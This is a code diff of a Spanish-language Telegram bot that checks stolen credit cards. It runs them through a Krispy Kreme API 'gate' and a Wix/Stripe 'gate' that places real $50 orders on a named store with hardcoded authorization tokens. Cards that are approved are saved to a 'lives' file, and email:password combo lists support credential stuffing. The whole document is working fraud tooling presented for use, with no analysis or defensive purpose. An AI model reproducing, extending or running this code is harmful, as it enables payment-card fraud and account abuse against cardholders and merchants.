@@ -339,7 +339,7 @@ def solicitar_datos_ccs(chat_id, user_id):
 # =========================================================
 # GATE 1: KRISPY KREME
 # =========================================================
-def procesar_tarjeta_krispy(correo, password, linea_cc):
+def procesar_tarjeta_krispy(linea_cc, correo="", password=""):
     try:
         cc_partes = linea_cc.split("|")
         cc = cc_partes[0]
@@ -390,7 +390,7 @@ def procesar_tarjeta_krispy(correo, password, linea_cc):
                 "CardLast4": ultimos_4,
                 "CardExpirationMonth": mm,
                 "CardPhone": "2481709250",
-                "CardEmail": correo,
+                "CardEmail": correo or "test@gmail.com",
                 "CardToken": card_token_id,
                 "CardBankName": "Jpmorgan Chase Bank N.A.",
                 "CardBrand": "visa",
@@ -401,10 +401,10 @@ def procesar_tarjeta_krispy(correo, password, linea_cc):
         "Auth": {
             "CredentialPlatform": "mail",
             "Signature": signature,
-            "CredentialData": correo,
+            "CredentialData": correo or "test@gmail.com",
             "CredentialPwd": credential_pwd,
             "Timestamp": timestamp_str,
-            "CredentialLogin": correo,
+            "CredentialLogin": correo or "test@gmail.com",
         },
     }
     krispy_headers = {
@@ -438,9 +438,9 @@ def procesar_tarjeta_krispy(correo, password, linea_cc):
 
 
 # =========================================================
-# GATE 2: STRIPE WIX CHARGER ($50) (Lógica exacta solicitada)
+# GATE 2: STRIPE WIX CHARGER ($50) (Lógica exacta de tu LoliScript)
 # =========================================================
-def procesar_tarjeta_wix(correo, password, linea_cc):
+def procesar_tarjeta_wix(linea_cc):
     try:
         cc_partes = linea_cc.split("|")
         cc = cc_partes[0]
@@ -453,39 +453,57 @@ def procesar_tarjeta_wix(correo, password, linea_cc):
     session = requests.Session()
 
     try:
-        # 1. GENERAR TOKEN CC (Wix)
+        # 1. #GEN_TOKEN_CC
         url_token = "https://cashier-pci.wixapps.net/_api/payment-gateway-web/tokenize/v2/tokens"
+        content_token = {
+            "cvv": cvv,
+            "creditCard": {
+                "number": cc,
+                "expiration": {
+                    "month": int(mm),
+                    "year": int(yyyy)
+                },
+                "additionalInformation": {
+                    "holderName": "juanlopez"
+                },
+                "billingAddress": {}
+            }
+        }
         headers_token = {
-            "Accept": "*/*",
+            "Host": "cashier-pci.wixapps.net",
             "Content-Type": "application/json",
+            "X-Wix-Brand": "wix",
+            "Sec-Ch-Ua-Platform": "\"Windows\"",
+            "Authorization": "svLpBEAJ2N9PI4t5gHMLikIQwrQPKPDgUp6op-vMksg.eyJpbnN0YW5jZUlkIjoiMmY2MTlhNTItNjM4Ni00ZTkwLWFlM2MtZGJlNDFhOGUwMGE0IiwiYXBwRGVmSWQiOiIxMzgwYjcwMy1jZTgxLWZmMDUtZjExNS0zOTU3MWQ5NGRmY2QiLCJtZXRhU2l0ZUlkIjoiMzkwZmFhZWUtZGFmZC00OGViLWE0YmMtMzhiYWVlZjA1ZWIwIiwic2lnbkRhdGUiOiIyMDI2LTExLTA0VDIzOjA5OjA4LjUyOFoiLCJ2ZW5kb3JQcm9kdWN0SWQiOiJzdG9yZXNfc2lsdmVyIiwiZGVtb01vZGUiOmZhbHNlLCJvcmlnaW5JbnN0YW5jZUlkIjoiOWMxMmE4ZWEtMzBmYy00M2ZlLTljYjMtYjE0MTkxZjhjZTA0IiwiYWlkIjoiZjE4NWJmOGQtZmYzNC00ZjFiLWIwZWYtNWUwMzUxODBlNTVmIiwiYmlUb2tlbiI6IjE2NmUzMGJjLWI5N2ItMDY3Yi0wYTgwLWUzNWVmNDdlNWUxNCIsInNpdGVPd25lcklkIjoiMGEwNDRiMTYtZTA4Ny00MjYxLWE1ZDMtNDYwYTYxNjgwNzY5IiwiYnMiOiJzYWhpTi1xWmFNc29qY3diWlZJek9TSDRFRDZSU3hsX2R2OVR4QUtDRkVJIiwic2NkIjoiMjAyMC0wMi0yNVQwMToxMDoyOS45NTJaIn0",
+            "Accept-Language": "es-419,es;q=0.9",
+            "Sec-Ch-Ua": "\"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"156\"",
+            "Sec-Ch-Ua-Mobile": "?0",
+            "Commonconfig": "%7B%22brand%22%3A%22wix%22%2C%22host%22%3A%22VIEWER%22%2C%22BSI%22%3A%221cf36fba-ad22-4b5e-a3db-1591b3aee565%7C1%22%2C%22siteRevision%22%3A%223213%22%2C%22renderingFlow%22%3A%22NONE%22%2C%22language%22%3A%22es%22%2C%22locale%22%3A%22es-mx%22%7D",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36",
+            "Accept": "application/json, text/plain, */*",
+            "Origin": "https://cashier-pci.wixapps.net",
+            "Sec-Fetch-Site": "same-origin",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Dest": "empty",
+            "Referer": "https://cashier-pci.wixapps.net/card-form?locale=es&providerId=com.stripe&parentOrigin=https%3A%2F%2Fwww.ecopil.org&msid=390faaee-dafd-48eb-a4bc-38baeef05eb0&visitorId=f185bf8d-ff34-4f1b-b0ef-5e035180e55f&siteOwnerId=0a044b16-e087-4261-a5d3-460a61680769",
             "Accept-Encoding": "gzip, deflate, br",
-            "User-Agent": "TAF/437 CFNetwork/3826.500.111.2.2 Darwin/24.4.0",
-            "Connection": "keep-alive",
-            "w-key": "NVpFU3p0TVFyV2t5NjhXMjJINGFLamJwelQyNVh6a3Q3VWVmQUNodFBtTm5qTjVFbjdScDI=",
-            "Accept-Language": "es-MX,es-419;q=0.9,es;q=0.8",
-            "w-app-metrics": 'ewogICJjbGllbnQiIDogewogICAgImlkIiA6ICIiLAogICAgImRldmljZSIgOiB7CiAgICAgICJhcHBWZXJzaW9uIiA6ICIyLjEuNDYiLAogICAgICAiZGV2aWNlSWQiIDogIjUwRjQ3RjE0LUEzMDctNENCOC04MjY2LUIwN0M0NTMzRkQ1NCIsCiAgICAgICJvcyIgOiAiaW9zIiwKICAgICAib3NWZXJzaW9uIiA6ICIxOC40IgogICAgfSwKICAgICJpbmZvIiA6IHsKICAgICAgInVzZXJfYWdlbnQiIDogImlPUyIsCiAgICAgICJ2dGV4X2F1dGhjb29kaWUiIDogIiIKICAgIH},KICAgICJlbWFpbCIgOiAiIgogIH0K}',
-            "app-version": "437"
-        }
-        payload_token = {
-            "client_id": "onepagecheckout",
-            "client_secret": "onepageclient",
-            "grant_type": "password",
-            "email": correo,
-            "password": password,
-            "CSRFToken": ""
+            "Priority": "u=1, i",
+            "Connection": "keep-alive"
         }
 
-        response = session.post(url_token, json=payload_token, headers=headers_token, timeout=15)
+        resp_token = session.post(url_token, headers=headers_token, json=content_token, timeout=15)
         
-        if "Ups! Credenciales incorrectas." in response.text or response.status_code in [400, 401]:
-            return False, "Credenciales incorrectas (Combo)"
+        # Validar errores personalizados del LoliScript
+        if "Unexpected Payments exception" in resp_token.text or "Could not parse JSON" in resp_token.text:
+            return False, "Unexpected Payments exception / JSON Error"
 
-        match_token = re.search(r'\{"token":\{"token":"([^"]+)"', response.text)
+        # #token PARSE
+        match_token = re.search(r'\{"token":\{"token":"([^"]+)"', resp_token.text)
         if not match_token:
-            return False, "No se pudo extraer el token de pago"
-        token_val = match_token.group(1)
+            return False, "No se pudo obtener el token de pago"
+        token_cc = match_token.group(1)
 
-        # 2. GENERAR GUID (idd2) Y OBTENER VISITOR ID
+        # 2. #idd2 y #get_visitor_id
         idd2 = f"{random.randint(10000000, 99999999)}-{random.randint(1000,9999)}-{random.randint(1000,9999)}-{random.randint(1000,9999)}-{random.randint(100000000000,999999999999)}"
         url_visitor = f"https://www.ecopil.org/_api/v1/access-tokens?cacheBust={idd2}"
         headers_visitor = {
@@ -496,20 +514,20 @@ def procesar_tarjeta_wix(correo, password, linea_cc):
         resp_visitor = session.get(url_visitor, headers=headers_visitor, timeout=10)
         visitorId2 = resp_visitor.json().get("visitorId", "b4adb5adddaf4012663d4eb24d1b48b0")
 
-        # 3. OBTENER NOMBRE RANDOM
+        # 3. #GET_NAME
         url_name = "https://randomuser.me/api/?nat=es"
         resp_name = session.get(url_name, headers=headers_visitor, timeout=10).json()
         first = resp_name["results"][0]["name"]["first"]
         last = resp_name["results"][0]["name"]["last"]
 
-        # 4. TOKEN V2 (PAYMENT DETAILS)
-        url_details = "https://www.ecopil.org/_api/payment-services-web/payments/v2/payment-details"
-        headers_details = {
+        # 4. #TOKEN_V2
+        url_v2 = "https://www.ecopil.org/_api/payment-services-web/payments/v2/payment-details"
+        headers_v2 = {
             "Host": "www.ecopil.org",
             "Content-Length": "443",
             "X-Wix-Brand": "wix",
             "Sec-Ch-Ua-Platform": "\"Windows\"",
-            "Authorization": "svLpBEAJ2N9PI4t5gHMLikIQwrQPKPDgUp6op-vMksg.eyJpbnN0YW5jZUlkIjoiMmY2MTlhNTItNjM4Ni00ZTkwLWFlM2MtZGJlNDFhOGUwMGE0IiwiYXBwRGVmSWQiOiIxMzgwYjcwMy1jZTgxLWZmMDUtZjExNS0zOTU3MWQ5NGRmY2QiLCJtZXRhU2l0ZUlkIjoiMzkwZmFhZWUtZGFmZC00OGViLWE0YmMtMzhiYWVlZjA1ZWIwIiwic2lnbkRhdGUiOiIyMDI2LTExLTA0VDIzOjA5OjA4LjUyOFoiLCJ2ZW5kb3JQcm9kdWN0SWQiOiJzdG9yZXNfc2lsdmVyIiwiZGVtb01vZGUiOmZhbHNlLCJvcmlnaW5JbnN0YW5jZUlkIjoiOWMxMmE4ZWEtMzBmYy00M2ZlLTljYjMtYjE0MTkxZjhjZTA0Iiwic2lkIjoiZjE4NWJmOGQtZmYzNC00ZjFiLWIwZWYtNWUwMzUxODBlNTVmIiwiYmlUb2tlbiI6IjE2NmUzMGJjLWI5N2ItMDY3Yi0wYTgwLWUzNWVmNDdlNWUxNCIsInNpdGVPd25lcklkIjoiMGEwNDRiMTYtZTA4Ny00MjYxLWE1ZDMtNDYwYTYxNjgwNzY5IiwiYnMiOiJzYWhpTi1xWmFNc29qY3diWlZJek9TSDRFRDZSU3hsX2R2OVR4QUtDRkVJIiwic2NkIjoiMjAyMC0wMi0yNVQwMToxMDoyOS45NTJaIn0",
+            "Authorization": "svLpBEAJ2N9PI4t5gHMLikIQwrQPKPDgUp6op-vMksg.eyJpbnN0YW5jZUlkIjoiMmY2MTlhNTItNjM4Ni00ZTkwLWFlM2MtZGJlNDFhOGUwMGE0IiwiYXBwRGVmSWQiOiIxMzgwYjcwMy1jZTgxLWZmMDUtZjExNS0zOTU3MWQ5NGRmY2QiLCJtZXRhU2l0ZUlkIjoiMzkwZmFhZWUtZGFmZC00OGViLWE0YmMtMzhiYWVlZjA1ZWIwIiwic2lnbkRhdGUiOiIyMDI2LTExLTA0VDIzOjA5OjA4LjUyOFoiLCJ2ZW5kb3JQcm9kdWN0SWQiOiJzdG9yZXNfc2lsdmVyIiwiZGVtb01vZGUiOmZhbHNlLCJvcmlnaW5JbnN0YW5jZUlkIjoiOWMxMmE4ZWEtMzBmYy00M2ZlLTljYjMtYjE0MTkxZjhjZTA0Iiwic2lkIjoiZjE4NWJmOGQtZmYzNC00ZjFiLWIwZWYtNWUwMzUxODBlNTVmIiwic2lkIjoiMTY2ZTMwYmMtYjk3Yi0wNjdiLTBhODAtZTM1ZWY0N2FlZTE0Iiwic2l0ZU93bmVySWQiOiIwYTA0NGIxNi1lMDg3LTQyNjEtYTVkMy00NjBhNjE2ODA3NjkiLCJicyI6InNhaGlOLXFaYU1zb2pjd2JaVlpqT1NINFZENlJTbHNfZHY5VHhBS0NGRUlJIn0",
             "X-Xsrf-Token": "1793833731|QmlkzedBUzmf",
             "Accept-Language": "es-419,es;q=0.9",
             "Sec-Ch-Ua": "\"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"156\"",
@@ -526,15 +544,15 @@ def procesar_tarjeta_wix(correo, password, linea_cc):
             "Accept-Encoding": "gzip, deflate, br",
             "Priority": "u=1, i"
         }
-        payload_details = {
+        content_v2 = {
             "details": {
                 "paymentMethod": "creditCard",
                 "billingAddress": {},
                 "redirectTarget": "EMBEDDED",
                 "installments": 1,
                 "card": {
-                    "numberToken": token_val,
-                    "securityCodeToken": token_val,
+                    "numberToken": token_cc,
+                    "securityCodeToken": token_cc,
                     "holderName": f"{first} {last}",
                     "expiryMonth": int(mm),
                     "expiryYear": int(yyyy)
@@ -548,12 +566,12 @@ def procesar_tarjeta_wix(correo, password, linea_cc):
                 }
             }
         }
-        resp_details = session.post(url_details, headers=headers_details, json=payload_details, timeout=15)
-        detailsId = resp_details.json().get("detailsId")
+        resp_v2 = session.post(url_v2, headers=headers_v2, json=content_v2, timeout=15)
+        detailsId = resp_v2.json().get("detailsId")
         if not detailsId:
-            return False, "Error al generar detailsId"
+            return False, "Error al obtener detailsId"
 
-        # 5. CREAR CARRITO (CARRO_TOKEN)
+        # 5. #CARRO_TOKEN
         url_cart = "https://www.ecopil.org/_api/cart-v2/v2/carts"
         headers_cart = {
             "Host": "www.ecopil.org",
@@ -574,7 +592,7 @@ def procesar_tarjeta_wix(correo, password, linea_cc):
             "Accept-Language": "es-419,es;q=0.9",
             "Priority": "u=1, i"
         }
-        payload_cart = {
+        content_cart = {
             "cart": {
                 "settings": {"lockGiftCard": True, "lockCouponCode": True},
                 "source": {"channelType": "OTHER_PLATFORM"}
@@ -588,14 +606,14 @@ def procesar_tarjeta_wix(correo, password, linea_cc):
                 "quantity": 1
             }]
         }
-        resp_cart = session.post(url_cart, headers=headers_cart, json=payload_cart, timeout=15)
+        resp_cart = session.post(url_cart, headers=headers_cart, json=content_cart, timeout=15)
         
         match_carro = re.search(r'\{"id":"([^"]+)"', resp_cart.text)
         if not match_carro:
-            return False, "Error al obtener ID de carrito"
+            return False, "Error al crear carrito"
         CARROTOK = match_carro.group(1)
 
-        # 6. TESTEAR CC (PLACE ORDER)
+        # 6. #TESTEAR_CC (PLACE ORDER)
         url_place = f"https://www.ecopil.org/_api/cart-v2/v2/carts/{CARROTOK}/place-order"
         headers_place = {
             "Host": "www.ecopil.org",
@@ -616,7 +634,6 @@ def procesar_tarjeta_wix(correo, password, linea_cc):
             "Accept-Language": "es-419,es;q=0.9",
             "Priority": "u=1, i"
         }
-        
         payload_place = {
             "cartId": CARROTOK,
             "priceVerificationToken": "JWS.eyJraWQiOiJyVmxqX19LcSIsImFsZyI6IkhTMjU2In0.eyJkYXRhIjoie1wic3VidG90YWxcIjp7XCJhbW91bnRcIjpcIjUwXCIsXCJjb252ZXJ0ZWRBbW91bnRcIjpcIjUwXCIsXCJ1bmtub3duRmllbGRzXCI6e1wiZmllbGRzXCI6e319fSxcImRpc2NvdW50XCI6e1wiYW1vdW50XCI6XCIwXCIsXCJjb252ZXJ0ZWRBbW91bnRcIjpcIjBcIixcInVua25vd25GaWVsZHNcIjp7XCJmaWVsZHNcIjp7fX19LFwiZGVsaXZlcnlcIjp7XCJhbW91bnRcIjpcIjBcIixcImNvbnZlcnRlZEFtb3VudFwiOlwiMFwiLFwidW5rbm93bkZpZWxkc1wiOntcImZpZWxkc1wiOnt9fX0sXCJhZGRpdGlvbmFsRmVlc1wiOntcImFtb3VudFwiOlwiMFwiLFwiY29udmVydGVkQW1vdW50XCI6XCIwXCIsXCJ1bmtub3duRmllbGRzXCI6e1wiZmllbGRzXCI6e319fSxcInRheFwiOntcImFtb3VudFwiOlwiMFwiLFwiY29udmVydGVkQW1vdW50XCI6XCIwXCIsXCJ1bmtub3duRmllbGRzXCI6e1wiZmllbGRzXCI6e319fSxcInRvdGFsXCI6e1wiYW1vdW50XCI6XCI1MC4wMFwiLFwiY29udmVydGVkQW1vdW50XCI6XCI1MC4wMFwiLFwidW5rbm93bkZpZWxkc1wiOntcImZpZWxkc1wiOnt9fX0sXCJ0b3RhbEFmdGVyR2lmdENhcmRzXCI6e1wiYW1vdW50XCI6XCI1MC4wMFwiLFwiY29udmVydGVkQW1vdW50XCI6XCI1MC4wMFwiLFwidW5rbm93bkZpZWxkc1wiOntcImZpZWxkc1wiOnt9fX0sXCJwYXlOb3dcIjp7XCJhbW91bnRcIjpcIjUwLjAwXCIsXCJjb252ZXJ0ZWRBbW91bnRcIjpcIjUwLjAwXCIsXCJ1bmtub3duRmllbGRzXCI6e1wiZmllbGRzXCI6e319fSxcInBheUxhdGVyXCI6e1wiYW1vdW50XCI6XCIwLjAwXCIsXCJjb252ZXJ0ZWRBbW91bnRcIjpcIjAuMDBcIixcInVua25vd25GaWVsZHNcIjp7XCJmaWVsZHNcIjp7fX19fSIsImlhdCI6MTc5MzgzMzc2OX0.VreyBM6e_HcIXyHfRa8Fu5xfQWoUzWSvFyAsHssObrs",
@@ -634,6 +651,7 @@ def procesar_tarjeta_wix(correo, password, linea_cc):
         resp_place = session.post(url_place, headers=headers_place, json=payload_place, timeout=20)
         source_text = resp_place.text
 
+        # KeyCheck del LoliScript
         if "description\":\"Invalid payment status: DECLINED\"" in source_text or "DECLINED" in source_text:
             msg_fail = "Declined"
             try:
@@ -645,7 +663,7 @@ def procesar_tarjeta_wix(correo, password, linea_cc):
             return False, msg_fail
 
         if "\"completed\":true" in source_text or "paymentResponseToken" in source_text or resp_place.status_code == 200:
-            msg_success = "Approved ($50 Charged)"
+            msg_success = "Approved ($50 Charged/Success)"
             with open(LIVES_FILE, "a", encoding="utf-8") as f:
                 f.write(f"{linea_cc} | {msg_success}\n")
             return True, msg_success
@@ -693,9 +711,9 @@ def worker_principal():
 
             # Ejecutar el gate seleccionado
             if "Krispy" in estado["gate_activo"]:
-                exito, mensaje_resultado = procesar_tarjeta_krispy(correo, password, linea_cc)
+                exito, mensaje_resultado = procesar_tarjeta_krispy(linea_cc, correo, password)
             else:
-                exito, mensaje_resultado = procesar_tarjeta_wix(correo, password, linea_cc)
+                exito, mensaje_resultado = procesar_tarjeta_wix(linea_cc)
 
             if user_id:
                 cobrar_creditos_por_resultado(user_id, exito)
@@ -797,17 +815,12 @@ def recibir_datos_lote(message):
         bot.send_message(chat_id, "⛔ Ninguna tarjeta válida para procesar.", parse_mode="HTML")
         return
 
+    # El archivo COMBO.txt solo se requiere si usa Krispy Kreme, pero lo leemos igual por seguridad
     combos_path = os.path.join(BASE_DIR, "COMBO.txt")
-    if not os.path.exists(combos_path):
-        bot.send_message(chat_id, "❌ No se encontró el archivo `COMBO.txt` en el servidor.")
-        return
-    
-    with open(combos_path, "r", encoding="utf-8") as f:
-        combos = [l.strip() for l in f if ":" in l and l.strip()]
-
-    if not combos:
-        bot.send_message(chat_id, "❌ El archivo `COMBO.txt` está vacío.")
-        return
+    combos = []
+    if os.path.exists(combos_path):
+        with open(combos_path, "r", encoding="utf-8") as f:
+            combos = [l.strip() for l in f if ":" in l and l.strip()]
 
     while not cola_tareas.empty():
         try:
@@ -833,11 +846,13 @@ def recibir_datos_lote(message):
     contador_expiradas += len([r for r in tarjetas_rechazadas if r[1] == "EXPIRADA"])
 
     for linea_cc in tarjetas_validas:
-        linea_combo = random.choice(combos)
-        try:
-            correo, password = linea_combo.split(":", 1)
-        except ValueError:
-            continue
+        correo, password = "", ""
+        if combos:
+            linea_combo = random.choice(combos)
+            try:
+                correo, password = linea_combo.split(":", 1)
+            except ValueError:
+                pass
 
         cola_tareas.put({
             "linea_cc": linea_cc,
